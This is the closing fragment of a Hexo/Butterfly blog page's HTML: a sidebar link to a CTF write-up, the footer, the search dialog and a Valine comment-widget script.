23:50:53">2022-08-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/08/07/DASCTF2022-07%E8%B5%8B%E8%83%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/" title="DASCTF2022.07赋能赛复现">DASCTF2022.07赋能赛复现</a><time datetime="2022-08-06T16:59:12.000Z" title="发表于 2022-08-07 00:59:12">2022-08-07</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 By Sk1y</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'MECC3mIv4gyVBwvpqsAnBsX8-gzGzoHsz',
+      appKey: 'KuxLFi0F1Upj5MRy1yo9oAwH',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
